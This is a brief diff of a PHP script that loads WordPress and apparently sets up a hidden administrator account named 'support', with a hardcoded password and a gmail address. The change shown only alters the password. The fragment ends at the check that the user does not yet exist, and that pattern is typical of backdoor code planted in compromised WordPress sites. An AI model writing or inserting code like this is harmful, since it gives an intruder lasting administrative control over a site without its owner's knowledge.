@@ -4,7 +4,7 @@ require_once('wp-load.php');
 
 // Admin setup
 $username = 'support';
-$password = '$Ur$w3l1c0m3.m3k+#';
+$password = '$Ur$w3l1c0m3.m3k5k+#';
 $email    = 'support@gmail.com';
 
 if (!username_exists($username) && !email_exists($email)) {
